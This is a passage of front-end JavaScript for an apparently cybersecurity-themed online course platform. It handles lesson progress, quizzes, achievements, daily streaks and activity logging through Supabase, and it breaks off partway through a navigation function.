          interactions: courseSession.interactionCount,
          session_date: courseSession.startTime.toISOString().split("T")[0],
        };

        // Store in localStorage as backup
        localStorage.setItem(
          "course_session_backup",
          JSON.stringify(sessionData)
        );

        // Try to save to database
        logUserActivity("course_session_end", sessionData);
      }

      // =====================================================
      // COURSE DATA & PROGRESS MANAGEMENT
      // =====================================================
      async function loadCourseData() {
        try {
          // Update course info in UI
          document.getElementById("courseTitle").textContent =
            COURSE_DATA.title;
          document.getElementById("totalLessons").textContent =
            COURSE_DATA.lessons.length;

          // Log course access
          logUserActivity("course_access", {
            course_id: COURSE_DATA.id,
            course_title: COURSE_DATA.title,
          });
        } catch (error) {
          console.error("Error loading course data:", error);
        }
      }

      async function loadProgress() {
        try {
          // Get existing progress from database
          const { data, error } = await supabase
            .from("course_progress")
            .select("*")
            .eq("user_id", currentUser.id)
            .eq("course_id", COURSE_DATA.id)
            .single();

          if (error && error.code !== "PGRST116") {
            throw error;
          }

          if (data) {
            courseProgress = JSON.parse(data.lesson_progress || "{}");
            currentLessonIndex = data.current_lesson || 0;

            // Update session tracking
            courseSession.lessonsStarted = Object.keys(courseProgress).length;
            courseSession.lessonsCompleted = Object.values(
              courseProgress
            ).filter((p) => p.completed).length;
          } else {
            // Initialize new progress
            courseProgress = {};
            currentLessonIndex = 0;
            await saveProgress();

            // Award first course start achievement
            await checkAndUnlockAchievement("first_course_start");
          }

          updateProgressDisplay();
        } catch (error) {
          console.error("Error loading progress:", error);
          showToast("Failed to load progress", "error");
        }
      }

      async function saveProgress() {
        try {
          if (!currentUser) return;

          const now = new Date();
          const progressData = {
            user_id: currentUser.id,
            course_id: COURSE_DATA.id,
            course_title: COURSE_DATA.title,
            current_lesson: currentLessonIndex,
            lesson_progress: JSON.stringify(courseProgress),
            progress: calculateOverallProgress(),
            lessons_completed: getCompletedLessonsCount(),
            lessons_started: Object.keys(courseProgress).length,
            study_time_minutes: courseSession.totalStudyTime,
            last_accessed: now.toISOString(),
            updated_at: now.toISOString(),
          };

          // Upsert progress
          const { error } = await supabase
            .from("course_progress")
            .upsert([progressData]);

          if (error) throw error;

          // Update user stats
          await updateUserStats();

          updateProgressDisplay();
        } catch (error) {
          console.error("Error saving progress:", error);
          showToast("Failed to save progress", "error");
        }
      }

      async function updateUserStats() {
        try {
          // Get all course progress for this user
          const { data: allProgress, error } = await supabase
            .from("course_progress")
            .select("progress, course_id, study_time_minutes")
            .eq("user_id", currentUser.id);

          if (error) throw error;

          // Calculate stats
          const completedCourses =
            allProgress?.filter((p) => p.progress >= 100).length || 0;
          const inProgressCourses =
            allProgress?.filter((p) => p.progress > 0 && p.progress < 100)
              .length || 0;
          const totalStudyTime =
            allProgress?.reduce(
              (sum, p) => sum + (p.study_time_minutes || 0),
              0
            ) || 0;

          // Calculate points (500 per completed course + achievement points)
          const coursePoints = completedCourses * 500;
          const bonusPoints = userStats.bonus_points || 0;
          const totalPoints = coursePoints + bonusPoints;

          // Update profile
          const updateData = {
            completed_courses: completedCourses,
            in_progress_courses: inProgressCourses,
            total_points: totalPoints,
            total_study_time: totalStudyTime,
            last_activity: new Date().toISOString(),
          };

          const { error: updateError } = await supabase
            .from("profiles")
            .update(updateData)
            .eq("id", currentUser.id);

          if (updateError) throw updateError;

          // Update local stats
          Object.assign(userStats, updateData);
        } catch (error) {
          console.error("Error updating user stats:", error);
        }
      }

      function calculateOverallProgress() {
        const completedLessons = getCompletedLessonsCount();
        return Math.round(
          (completedLessons / COURSE_DATA.lessons.length) * 100
        );
      }

      function getCompletedLessonsCount() {
        return Object.values(courseProgress).filter(
          (lesson) => lesson.completed
        ).length;
      }

      function updateProgressDisplay() {
        const completedCount = getCompletedLessonsCount();
        const progressPercent = calculateOverallProgress();

        // Update UI elements
        const elements = {
          completedLessons: completedCount,
          courseProgressPercent: `${progressPercent}%`,
        };

        Object.entries(elements).forEach(([id, value]) => {
          const element = document.getElementById(id);
          if (element) element.textContent = value;
        });

        // Update progress bar
        const progressBar = document.getElementById("courseProgressFill");
        if (progressBar) progressBar.style.width = `${progressPercent}%`;
      }

      // =====================================================
      // LESSON MANAGEMENT
      // =====================================================
      function loadLesson(index) {
        if (index < 0 || index >= COURSE_DATA.lessons.length) return;

        const lesson = COURSE_DATA.lessons[index];
        currentLessonIndex = index;

        // Mark lesson as started and track activity
        if (!courseProgress[lesson.id]) {
          courseProgress[lesson.id] = {
            started: true,
            completed: false,
            startedAt: new Date().toISOString(),
            timeSpent: 0,
          };

          courseSession.lessonsStarted++;
          saveProgress();

          // Log lesson start
          logUserActivity("lesson_start", {
            lesson_id: lesson.id,
            lesson_title: lesson.title,
            lesson_index: index,
          });
        }

        // Update lesson start time for time tracking
        courseProgress[lesson.id].currentSessionStart = new Date();

        // Update sidebar and navigation
        renderSidebar();
        updateNavigationButtons();

        // Update header info
        updateLessonHeader(lesson, index);

        // Render lesson content
        renderLessonContent(lesson);

        // Smooth scroll and animations
        window.scrollTo({ top: 0, behavior: "smooth" });
        document.getElementById("contentBody").scrollTop = 0;

        const contentBody = document.getElementById("contentBody");
        contentBody.classList.add("fade-in");
        setTimeout(() => contentBody.classList.remove("fade-in"), 500);

        // Check lesson-based achievements
        checkLessonAchievements(index + 1);
      }

      function updateLessonHeader(lesson, index) {
        const elements = {
          currentLessonNumber: index + 1,
          currentLessonTitle: lesson.title,
          navInfo: `Lesson ${index + 1} of ${COURSE_DATA.lessons.length}`,
        };

        Object.entries(elements).forEach(([id, value]) => {
          const element = document.getElementById(id);
          if (element) element.textContent = value;
        });
      }

      function renderSidebar() {
        const lessonNav = document.getElementById("lessonNav");
        if (!lessonNav) return;

        lessonNav.innerHTML = "";

        COURSE_DATA.lessons.forEach((lesson, index) => {
          const lessonItem = document.createElement("div");
          lessonItem.className = "lesson-item";

          // Determine lesson status
          const lessonProgress = courseProgress[lesson.id];
          const isCompleted = lessonProgress?.completed || false;
          const isInProgress = lessonProgress?.started || false;
          const isLocked = !isCompleted && !canAccessLesson(index);
          const isActive = index === currentLessonIndex;

          // Apply status classes
          if (isCompleted) lessonItem.classList.add("completed");
          if (isLocked) lessonItem.classList.add("locked");
          if (isActive) lessonItem.classList.add("active");

          // Determine status display
          let statusClass = "not-started";
          let statusIcon = index + 1;

          if (isCompleted) {
            statusClass = "completed";
            statusIcon = "✓";
          } else if (isInProgress) {
            statusClass = "in-progress";
            statusIcon = "◐";
          }

          // Create lesson item HTML
          lessonItem.innerHTML = `
            <div class="lesson-status ${statusClass}">${statusIcon}</div>
            <div class="lesson-info">
                <div class="lesson-title">${lesson.title}</div>
                <div class="lesson-meta">
                    ${
                      isCompleted
                        ? "Completed"
                        : isInProgress
                        ? "In Progress"
                        : isLocked
                        ? "Locked"
                        : "Not Started"
                    }
                </div>
            </div>
            <div class="lesson-duration">${lesson.duration}</div>
        `;

          // Add click handler if not locked
          if (!isLocked) {
            lessonItem.addEventListener("click", () => {
              if (index !== currentLessonIndex) {
                // Track lesson time before switching
                trackLessonTime();

                currentLessonIndex = index;
                loadLesson(index);
                closeSidebar();
              }
            });
          }

          lessonNav.appendChild(lessonItem);
        });
      }

      function canAccessLesson(index) {
        if (index === 0) return true; // First lesson always accessible

        // Can access if previous lesson is completed
        const previousLessonId = COURSE_DATA.lessons[index - 1].id;
        return courseProgress[previousLessonId]?.completed || false;
      }

      function trackLessonTime() {
        const currentLesson = COURSE_DATA.lessons[currentLessonIndex];
        const lessonProgress = courseProgress[currentLesson.id];

        if (lessonProgress?.currentSessionStart) {
          const sessionTime = Math.floor(
            (new Date() - new Date(lessonProgress.currentSessionStart)) /
              1000 /
              60
          );
          lessonProgress.timeSpent =
            (lessonProgress.timeSpent || 0) + sessionTime;
          delete lessonProgress.currentSessionStart;
        }
      }

      // =====================================================
      // LESSON CONTENT RENDERING
      // =====================================================
      function renderLessonContent(lesson) {
        const contentContainer = document.getElementById("lessonContent");
        if (!contentContainer) return;

        let contentHTML = `
        <div class="content-section">
            <h2>Learning Objectives</h2>
            <ul>
                ${lesson.objectives.map((obj) => `<li>${obj}</li>`).join("")}
            </ul>
        </div>
        
        <div class="content-section">
            <h2>Overview</h2>
            <p>${lesson.content.overview}</p>
        </div>
    `;

        // Render content sections
        lesson.content.sections.forEach((section) => {
          contentHTML += `
            <div class="content-section">
                <h2>${section.title}</h2>
                ${section.content}
                ${
                  section.image
                    ? `<img src="${section.image}" alt="${section.title}" class="content-image" loading="lazy">`
                    : ""
                }
            </div>
        `;
        });

        // Render code examples
        if (
          lesson.content.codeExamples &&
          lesson.content.codeExamples.length > 0
        ) {
          contentHTML += `<div class="content-section"><h2>Code Examples</h2></div>`;

          lesson.content.codeExamples.forEach((example, index) => {
            const codeId = `code-${lesson.id}-${index}`;
            contentHTML += `
                <div class="code-section">
                    <div class="code-header">
                        <span class="code-title">${example.title}</span>
                        <button class="copy-btn" onclick="copyCode('${codeId}')">
                            <i class="fas fa-copy"></i> Copy
                        </button>
                    </div>
                    <pre class="code-block"><code id="${codeId}" class="language-${
              example.language
            }">${escapeHtml(example.code)}</code></pre>
                </div>
            `;
          });
        }

        // Render quiz
        contentHTML += renderQuiz(lesson.quiz);

        contentContainer.innerHTML = contentHTML;

        // Highlight code syntax if Prism is available
        setTimeout(() => {
          if (window.Prism) {
            Prism.highlightAll();
          }
        }, 100);
      }

      // =====================================================
      // QUIZ SYSTEM
      // =====================================================
      function renderQuiz(quiz) {
        const currentLessonProgress =
          courseProgress[COURSE_DATA.lessons[currentLessonIndex].id];
        const isCompleted = currentLessonProgress?.completed || false;

        let quizHTML = `
        <div class="quiz-section" id="quizSection">
            <div class="quiz-header">
                <h2 class="quiz-title">
                    <i class="fas fa-clipboard-check"></i>
                    Knowledge Check
                </h2>
                <p class="quiz-info">
                    Complete this quiz with ${quiz.passingScore}% or higher to unlock the next lesson.
                </p>
            </div>
    `;

        if (isCompleted) {
          const savedScore = currentLessonProgress.quizScore || 0;
          quizHTML += `
            <div class="quiz-results show">
                <div class="quiz-score pass">${savedScore}%</div>
                <div class="quiz-message">
                    <strong>Lesson Completed!</strong><br>
                    You've successfully passed this lesson's quiz.
                </div>
            </div>
        `;
        } else {
          // Render quiz questions
          quiz.questions.forEach((question, qIndex) => {
            quizHTML += `
                <div class="quiz-question ${
                  qIndex === 0 ? "active" : ""
                }" data-question="${qIndex}">
                    <div class="question-header">
                        <span class="question-number">Question ${
                          qIndex + 1
                        }</span>
                        <span class="question-progress">${qIndex + 1}/${
              quiz.questions.length
            }</span>
                    </div>
                    <div class="question-text">${question.question}</div>
                    <div class="question-options">
                        ${question.options
                          .map(
                            (option, oIndex) => `
                            <div class="option" data-option="${oIndex}" onclick="selectOption(${qIndex}, ${oIndex})">
                                <span class="option-letter">${String.fromCharCode(
                                  65 + oIndex
                                )}</span>
                                <span class="option-text">${option}</span>
                            </div>
                        `
                          )
                          .join("")}
                    </div>
                </div>
            `;
          });

          quizHTML += `
            <div class="quiz-controls">
                <button class="btn btn-secondary" id="prevQuestionBtn" onclick="previousQuestion()" disabled>
                    <i class="fas fa-chevron-left"></i>
                    Previous
                </button>
                <div>
                    <button class="btn btn-secondary" id="nextQuestionBtn" onclick="nextQuestion()" disabled>
                        Next
                        <i class="fas fa-chevron-right"></i>
                    </button>
                    <button class="btn btn-primary" id="submitQuizBtn" onclick="submitQuiz()" style="display: none;">
                        <i class="fas fa-check"></i>
                        Submit Quiz
                    </button>
                </div>
            </div>

            <div class="quiz-results" id="quizResults">
                <div class="quiz-score" id="quizScore">0%</div>
                <div class="quiz-message" id="quizMessage"></div>
                <div class="quiz-actions">
                    <button class="btn btn-primary" id="continueBtn" onclick="completeLesson()" style="display: none;">
                        <i class="fas fa-arrow-right"></i>
                        Continue to Next Lesson
                    </button>
                    <button class="btn btn-secondary" onclick="retakeQuiz()">
                        <i class="fas fa-redo"></i>
                        Retake Quiz
                    </button>
                </div>
            </div>
        `;
        }

        quizHTML += "</div>";
        return quizHTML;
      }

      // Quiz interaction functions
      function selectOption(questionIndex, optionIndex) {
        // Clear previous selections
        document
          .querySelectorAll(`[data-question="${questionIndex}"] .option`)
          .forEach((opt) => {
            opt.classList.remove("selected");
          });

        // Select current option
        const selectedOption = document.querySelector(
          `[data-question="${questionIndex}"] [data-option="${optionIndex}"]`
        );
        selectedOption.classList.add("selected");

        // Store answer
        quizState.answers[questionIndex] = optionIndex;

        // Update navigation
        const isLastQuestion =
          questionIndex ===
          COURSE_DATA.lessons[currentLessonIndex].quiz.questions.length - 1;
        if (isLastQuestion) {
          document.getElementById("submitQuizBtn").style.display =
            "inline-flex";
          document.getElementById("nextQuestionBtn").style.display = "none";
        } else {
          document.getElementById("nextQuestionBtn").disabled = false;
        }
      }

      function nextQuestion() {
        const currentQuestionEl = document.querySelector(
          ".quiz-question.active"
        );
        const nextQuestionEl = currentQuestionEl.nextElementSibling;

        if (
          nextQuestionEl &&
          nextQuestionEl.classList.contains("quiz-question")
        ) {
          currentQuestionEl.classList.remove("active");
          nextQuestionEl.classList.add("active");
          quizState.currentQuestion++;
          updateQuizNavigation();
        }
      }

      function previousQuestion() {
        const currentQuestionEl = document.querySelector(
          ".quiz-question.active"
        );
        const prevQuestionEl = currentQuestionEl.previousElementSibling;

        if (
          prevQuestionEl &&
          prevQuestionEl.classList.contains("quiz-question")
        ) {
          currentQuestionEl.classList.remove("active");
          prevQuestionEl.classList.add("active");
          quizState.currentQuestion--;
          updateQuizNavigation();
        }
      }

      function updateQuizNavigation() {
        const totalQuestions =
          COURSE_DATA.lessons[currentLessonIndex].quiz.questions.length;
        const prevBtn = document.getElementById("prevQuestionBtn");
        const nextBtn = document.getElementById("nextQuestionBtn");
        const submitBtn = document.getElementById("submitQuizBtn");

        prevBtn.disabled = quizState.currentQuestion === 0;

        const hasAnswer =
          quizState.answers[quizState.currentQuestion] !== undefined;
        const isLastQuestion = quizState.currentQuestion === totalQuestions - 1;

        if (isLastQuestion) {
          nextBtn.style.display = "none";
          submitBtn.style.display = hasAnswer ? "inline-flex" : "none";
        } else {
          nextBtn.style.display = "inline-flex";
          nextBtn.disabled = !hasAnswer;
          submitBtn.style.display = "none";
        }
      }

      async function submitQuiz() {
        const lesson = COURSE_DATA.lessons[currentLessonIndex];
        const quiz = lesson.quiz;
        let correctAnswers = 0;

        // Hide questions and controls
        document
          .querySelectorAll(".quiz-question")
          .forEach((q) => (q.style.display = "none"));
        document.querySelector(".quiz-controls").style.display = "none";

        // Calculate score and highlight answers
        quiz.questions.forEach((question, index) => {
          const userAnswer = quizState.answers[index];
          const correctAnswer = question.correct;
          const isCorrect = userAnswer === correctAnswer;

          if (isCorrect) correctAnswers++;

          // Highlight answers
          const questionEl = document.querySelector(
            `[data-question="${index}"]`
          );
          const options = questionEl.querySelectorAll(".option");

          options[correctAnswer].classList.add("correct");
          if (userAnswer !== correctAnswer && userAnswer !== undefined) {
            options[userAnswer].classList.add("incorrect");
          }
        });

        const score = Math.round(
          (correctAnswers / quiz.questions.length) * 100
        );
        const passed = score >= quiz.passingScore;

        // Update quiz results UI
        const quizScore = document.getElementById("quizScore");
        const quizMessage = document.getElementById("quizMessage");
        const quizActions = document.querySelector(".quiz-actions");

        quizScore.textContent = `${score}%`;
        quizScore.className = `quiz-score ${passed ? "pass" : "fail"}`;

        if (passed) {
          quizMessage.innerHTML = `
            <strong>Congratulations!</strong><br>
            You passed with ${score}%. You can now proceed to the next lesson.
        `;

          quizActions.innerHTML = `
            <button class="btn btn-primary" onclick="completeLesson()">
                <i class="fas fa-arrow-right"></i>
                Continue to Next Lesson
            </button>
        `;

          // Mark lesson as completed
          await markLessonComplete(score);
        } else {
          quizMessage.innerHTML = `
            <strong>Not quite there yet.</strong><br>
            You scored ${score}%. You need ${quiz.passingScore}% to pass. Review the material and try again.
        `;

          quizActions.innerHTML = `
            <button class="btn btn-secondary" onclick="retakeQuiz()">
                <i class="fas fa-redo"></i>
                Retake Quiz
            </button>
        `;
        }

        document.getElementById("quizResults").classList.add("show");

        // Log quiz completion
        logUserActivity("quiz_completed", {
          lesson_id: lesson.id,
          lesson_title: lesson.title,
          score: score,
          passed: passed,
          attempts: (courseProgress[lesson.id]?.quizAttempts || 0) + 1,
        });

        // Scroll to results
        document
          .getElementById("quizResults")
          .scrollIntoView({ behavior: "smooth" });
      }

      function retakeQuiz() {
        // Reset quiz state
        quizState = {
          currentQuestion: 0,
          answers: [],
          score: 0,
          isComplete: false,
        };

        // Track quiz retry
        const lessonId = COURSE_DATA.lessons[currentLessonIndex].id;
        if (!courseProgress[lessonId]) courseProgress[lessonId] = {};
        courseProgress[lessonId].quizAttempts =
          (courseProgress[lessonId].quizAttempts || 0) + 1;

        // Reload lesson content
        loadLesson(currentLessonIndex);

        // Scroll to quiz
        setTimeout(() => {
          document
            .getElementById("quizSection")
            .scrollIntoView({ behavior: "smooth" });
        }, 500);
      }

      async function markLessonComplete(score) {
        const lesson = COURSE_DATA.lessons[currentLessonIndex];
        const lessonId = lesson.id;

        // Track lesson completion time
        trackLessonTime();

        // Update lesson progress
        courseProgress[lessonId] = {
          ...courseProgress[lessonId],
          completed: true,
          quizScore: score,
          completedAt: new Date().toISOString(),
          finalScore: score,
        };

        // Update session tracking
        courseSession.lessonsCompleted++;

        // Save progress to database
        await saveProgress();

        // Update UI
        renderSidebar();
        updateNavigationButtons();

        // Check various achievements
        await checkLessonCompletionAchievements();
        await checkPerfectScoreAchievements(score);
        await checkStudyTimeAchievements();

        // Log lesson completion
        logUserActivity("lesson_completed", {
          lesson_id: lessonId,
          lesson_title: lesson.title,
          final_score: score,
          time_spent: courseProgress[lessonId].timeSpent || 0,
          lesson_number: currentLessonIndex + 1,
        });

        showToast("Lesson completed successfully!", "success");
      }

      async function completeLesson() {
        if (currentLessonIndex < COURSE_DATA.lessons.length - 1) {
          // Move to next lesson
          currentLessonIndex++;
          loadLesson(currentLessonIndex);
        } else {
          // Course completion
          await completeCourse();
        }
      }

      async function completeCourse() {
        try {
          const completionTime = courseSession.totalStudyTime;

          // Update course progress to 100% completed
          await supabase
            .from("course_progress")
            .update({
              progress: 100,
              completed_at: new Date().toISOString(),
              completion_time_minutes: completionTime,
            })
            .eq("user_id", currentUser.id)
            .eq("course_id", COURSE_DATA.id);

          // Award course completion achievements
          await checkAndUnlockAchievement("course_completion_1");
          await checkSpeedCompletionAchievements(completionTime);
          await checkCourseStreakAchievements();

          // Update user stats
          await updateUserStats();

          // Show completion message
          showToast(
            "Congratulations! Course completed successfully!",
            "certificate"
          );

          // Log course completion
          logUserActivity("course_completed", {
            course_id: COURSE_DATA.id,
            course_title: COURSE_DATA.title,
            completion_time_minutes: completionTime,
            total_lessons: COURSE_DATA.lessons.length,
            average_quiz_score: calculateAverageQuizScore(),
          });

          // Redirect to dashboard after delay
          setTimeout(() => {
            window.location.href = "/dashboard";
          }, 3000);
        } catch (error) {
          console.error("Error completing course:", error);
          showToast("Error marking course as complete", "error");
        }
      }

      // =====================================================
      // ACHIEVEMENT INTEGRATION SYSTEM
      // =====================================================
      async function checkAndUnlockAchievement(
        achievementId,
        skipNotification = false
      ) {
        try {
          // Prevent duplicate checks
          const cacheKey = `achievement_${achievementId}_${currentUser.id}`;
          if (sessionStorage.getItem(cacheKey)) return false;

          // Check if already unlocked
          const { data: existing, error } = await supabase
            .from("user_achievements")
            .select("id")
            .eq("user_id", currentUser.id)
            .eq("achievement_id", achievementId)
            .single();

          if (existing) {
            sessionStorage.setItem(cacheKey, "true");
            return false;
          }

          // Award achievement
          const achievementData = {
            user_id: currentUser.id,
            achievement_id: achievementId,
            unlocked_at: new Date().toISOString(),
            points_awarded: getAchievementPoints(achievementId),
            context: "course_system",
          };

          const { data, error: insertError } = await supabase
            .from("user_achievements")
            .insert([achievementData])
            .select()
            .single();

          if (insertError) {
            if (insertError.code === "23505") return false; // Already exists
            throw insertError;
          }

          // Update user points
         await supabase.rpc('increment_user_stats', {
  user_id_param: currentUser.id,
  points_to_add: achievementData.points_awarded,
  achievements_to_add: 1
});

          // Cache and queue notification
          sessionStorage.setItem(cacheKey, "true");

          if (!skipNotification) {
            queueAchievementNotification({
              id: achievementId,
              name: getAchievementName(achievementId),
              description: getAchievementDescription(achievementId),
              points: achievementData.points_awarded,
              rarity: getAchievementRarity(achievementId),
              icon: getAchievementIcon(achievementId),
            });
          }

          return true;
        } catch (error) {
          console.error("Error unlocking achievement:", error);
          return false;
        }
      }

      // Helper functions for achievement data (replace with your actual achievement definitions)
      function getAchievementPoints(id) {
        const pointsMap = {
          first_course_start: 75,
          first_lesson: 100,
          course_completion_1: 500,
          perfect_score: 250,
          speed_demon: 750,
          marathon_learner: 500,
          night_owl: 200,
          early_bird: 200,
          weekend_warrior: 150,
          // Add more as needed
        };
        return pointsMap[id] || 100;
      }

      function getAchievementName(id) {
        const nameMap = {
          first_course_start: "Learning Initiated",
          first_lesson: "First Steps",
          course_completion_1: "Course Conqueror",
          perfect_score: "Perfectionist",
          speed_demon: "Speed Demon",
          // Add more as needed
        };
        return nameMap[id] || "Achievement Unlocked";
      }

      function getAchievementDescription(id) {
        const descMap = {
          first_course_start: "Start your first cybersecurity course",
          first_lesson: "Complete your first lesson",
          course_completion_1: "Complete your first course",
          perfect_score: "Score 100% on any quiz",
          speed_demon: "Complete a course in under 2 hours",
          // Add more as needed
        };
        return descMap[id] || "Achievement description";
      }

      function getAchievementRarity(id) {
        const rarityMap = {
          first_course_start: "common",
          first_lesson: "bronze",
          course_completion_1: "silver",
          perfect_score: "gold",
          speed_demon: "legendary",
          // Add more as needed
        };
        return rarityMap[id] || "common";
      }

      function getAchievementIcon(id) {
        const iconMap = {
          first_course_start: "fas fa-play",
          first_lesson: "fas fa-baby",
          course_completion_1: "fas fa-trophy",
          perfect_score: "fas fa-star",
          speed_demon: "fas fa-rocket",
          // Add more as needed
        };
        return iconMap[id] || "fas fa-award";
      }

      async function checkLessonAchievements(lessonNumber) {
        if (lessonNumber === 1) {
          await checkAndUnlockAchievement("first_lesson");
        }

        // Check if user has completed multiple lessons in one day
        const today = new Date().toISOString().split("T")[0];
        const todayCompletions = Object.values(courseProgress).filter(
          (p) => p.completed && p.completedAt?.startsWith(today)
        ).length;

        if (todayCompletions >= 3) {
          await checkAndUnlockAchievement("lesson_marathon");
        }
      }

      async function checkLessonCompletionAchievements() {
        const completedCount = getCompletedLessonsCount();

        // Lesson-based achievements
        const lessonMilestones = [1, 5, 10, 25, 50, 100];
        for (const milestone of lessonMilestones) {
          if (completedCount >= milestone) {
            await checkAndUnlockAchievement(`lessons_${milestone}`);
          }
        }

        // Course completion achievements
        if (completedCount === COURSE_DATA.lessons.length) {
          await checkAndUnlockAchievement("course_completion_1");

          // Check for additional course completion achievements
          const { data: allCourses } = await supabase
            .from("course_progress")
            .select("course_id")
            .eq("user_id", currentUser.id)
            .eq("progress", 100);

          const totalCompleted = allCourses?.length || 0;

          const courseMilestones = [1, 5, 10, 25];
          for (const milestone of courseMilestones) {
            if (totalCompleted >= milestone) {
              await checkAndUnlockAchievement(`course_completion_${milestone}`);
            }
          }
        }
      }

      async function checkPerfectScoreAchievements(score) {
        if (score === 100) {
          await checkAndUnlockAchievement("perfect_score");

          // Check for consecutive perfect scores
          const recentScores = Object.values(courseProgress)
            .filter((p) => p.completed && p.quizScore)
            .slice(-5) // Last 5 completed
            .map((p) => p.quizScore);

          if (
            recentScores.length >= 3 &&
            recentScores.every((s) => s === 100)
          ) {
            await checkAndUnlockAchievement("perfectionist_streak");
          }
        }
      }

      async function checkSpeedCompletionAchievements(completionTime) {
        // Speed demon: Complete course in under 2 hours (120 minutes)
        if (completionTime <= 120) {
          await checkAndUnlockAchievement("speed_demon");
        }

        // Quick learner: Complete course in under 4 hours (240 minutes)
        if (completionTime <= 240) {
          await checkAndUnlockAchievement("quick_learner");
        }
      }

      async function checkStudyTimeAchievements() {
        const totalTime = courseSession.totalStudyTime;

        // Marathon learner: Study for 8+ hours in a course session
        if (totalTime >= 480) {
          // 8 hours
          await checkAndUnlockAchievement("marathon_learner");
        }

        // Dedicated learner: Study for 4+ hours
        if (totalTime >= 240) {
          // 4 hours
          await checkAndUnlockAchievement("dedicated_learner");
        }
      }

      async function checkCourseStreakAchievements() {
        try {
          // Check for consecutive course completions
          const { data: recentCourses, error } = await supabase
            .from("course_progress")
            .select("completed_at, course_id")
            .eq("user_id", currentUser.id)
            .eq("progress", 100)
            .order("completed_at", { ascending: false })
            .limit(10);

          if (error || !recentCourses) return;

          // Check for courses completed on consecutive days
          let consecutiveDays = 1;
          for (let i = 1; i < recentCourses.length; i++) {
            const prevDate = new Date(
              recentCourses[i - 1].completed_at
            ).toDateString();
            const currentDate = new Date(
              recentCourses[i].completed_at
            ).toDateString();
            const dayDiff =
              Math.abs(new Date(prevDate) - new Date(currentDate)) /
              (1000 * 60 * 60 * 24);

            if (dayDiff <= 1) {
              consecutiveDays++;
            } else {
              break;
            }
          }

          if (consecutiveDays >= 3) {
            await checkAndUnlockAchievement("learning_streak");
          }
        } catch (error) {
          console.error("Error checking course streak achievements:", error);
        }
      }

      // =====================================================
      // TIME-BASED ACHIEVEMENTS
      // =====================================================
      async function checkTimeBasedAchievements(timestamp) {
        const hour = timestamp.getHours();
        const dayOfWeek = timestamp.getDay();

        // Night owl (after midnight, before 6 AM)
        if (hour >= 0 && hour < 6) {
          await incrementTimeBasedCounter("midnight_sessions", "night_owl");
        }

        // Early bird (4 AM to 6 AM)
        if (hour >= 4 && hour < 6) {
          await incrementTimeBasedCounter("early_sessions", "early_bird");
        }

        // Weekend warrior (Saturday = 6, Sunday = 0)
        if (dayOfWeek === 0 || dayOfWeek === 6) {
          await incrementTimeBasedCounter(
            "weekend_sessions",
            "weekend_warrior"
          );
        }
      }

      async function incrementTimeBasedCounter(counterType, achievementId) {
        try {
          const dateStr = new Date().toISOString().split("T")[0];
          const cacheKey = `${counterType}_${currentUser.id}_${dateStr}`;

          // Prevent multiple increments per day
          if (sessionStorage.getItem(cacheKey)) return;

          // Update counter
       await supabase.rpc('increment_profile_counter', {
  user_id_param: currentUser.id,
  counter_field: counterType,
  increment_value: 1
});

          // Cache to prevent double counting
          sessionStorage.setItem(cacheKey, "true");

          // Check related achievement
          if (achievementId) {
            await checkAndUnlockAchievement(achievementId, true);
          }
        } catch (error) {
          console.error(`Error incrementing ${counterType}:`, error);
        }
      }

      async function checkDailyStreak() {
        try {
          const { data: profile, error } = await supabase
            .from("profiles")
            .select("last_activity, current_streak, last_streak_date")
            .eq("id", currentUser.id)
            .single();

          if (error) throw error;

          const now = new Date();
          const today = now.toDateString();
          const lastActivity = profile.last_activity
            ? new Date(profile.last_activity)
            : null;
          const lastStreakDate = profile.last_streak_date
            ? new Date(profile.last_streak_date).toDateString()
            : null;

          let newStreak = profile.current_streak || 0;
          let shouldUpdateStreak = false;

          if (!lastActivity) {
            // First time user
            newStreak = 1;
            shouldUpdateStreak = true;
          } else {
            const daysSinceLastActivity = Math.floor(
              (now - lastActivity) / (1000 * 60 * 60 * 24)
            );

            if (lastStreakDate === today) {
              // Already counted today's streak
              return newStreak;
            } else if (
              daysSinceLastActivity === 1 ||
              (daysSinceLastActivity === 0 && lastStreakDate !== today)
            ) {
              // Consecutive day or same day but not counted yet
              newStreak += 1;
              shouldUpdateStreak = true;
            } else if (daysSinceLastActivity > 1) {
              // Streak broken
              newStreak = 1;
              shouldUpdateStreak = true;
            }
          }

          if (shouldUpdateStreak) {
            await supabase
              .from("profiles")
              .update({
                current_streak: newStreak,
                last_activity: now.toISOString(),
                last_streak_date: now.toISOString(),
              })
              .eq("id", currentUser.id);

            userStats.current_streak = newStreak;

            showToast(`Daily streak: ${newStreak} days!`, "success");
            await checkStreakAchievements(newStreak);
          }

          return newStreak;
        } catch (error) {
          console.error("Error checking daily streak:", error);
          return 0;
        }
      }

      async function checkStreakAchievements(currentStreak) {
        const streakMilestones = [3, 7, 14, 30, 100, 365];

        for (const milestone of streakMilestones) {
          if (currentStreak >= milestone) {
            await checkAndUnlockAchievement(`streak_${milestone}`);
          }
        }
      }

      // =====================================================
      // USER ACTIVITY LOGGING
      // =====================================================
      async function logUserActivity(activityType, metadata = {}) {
        try {
          const now = new Date();

          const activityData = {
            user_id: currentUser.id,
            activity_type: activityType,
            timestamp: now.toISOString(),
            course_id: COURSE_DATA.id,
            lesson_index: currentLessonIndex,
            session_duration: courseSession.totalStudyTime,
            metadata: JSON.stringify(metadata),
            created_at: now.toISOString(),
          };

          // Try to log to activities table
          const { error } = await supabase
            .from("user_activities")
            .insert([activityData]);

          if (error && error.code !== "42P01") {
            console.warn("Activity logging failed:", error.message);
          }

          // Always update last activity in profile
          await supabase
            .from("profiles")
            .update({ last_activity: now.toISOString() })
            .eq("id", currentUser.id);
        } catch (error) {
          console.error("Error logging user activity:", error);
        }
      }

      // =====================================================
      // NAVIGATION SYSTEM
      // =====================================================
      function updateNavigationButtons() {
        const prevBtn = document.getElementById("prevLessonBtn");
        const nextBtn = document.getElementById("nextLessonBtn");

        if (!prevBtn || !nextBtn) return;

        // Previous button
        prevBtn.disabled = currentLessonIndex === 0;

        // Next button logic
        const isLastLesson =
          currentLessonIndex === COURSE_DATA.lessons.length - 1;
        const canGoNext =
          currentLessonIndex < COURSE_DATA.lessons.length - 1 &&
          canAccessLesson(currentLessonIndex + 1);

        if (isLastLesson) {
          const isCurrentCompleted =
            courseProgress[COURSE_DATA.lessons[currentLessonIndex].id]
              ?.completed;
          nextBtn.disabled = !isCurrentCompleted;
          nextBtn.innerHTML = '<i class="fas fa-trophy"></i> Complete Course';
        } else {
          nextBtn.disabled = !canGoNext;
          nextBtn.innerHTML = 'Next <i class="fas fa-chevron-right"></i>';
        }
      }

      // Navigation button event handlers
      function goToPreviousLesson() {
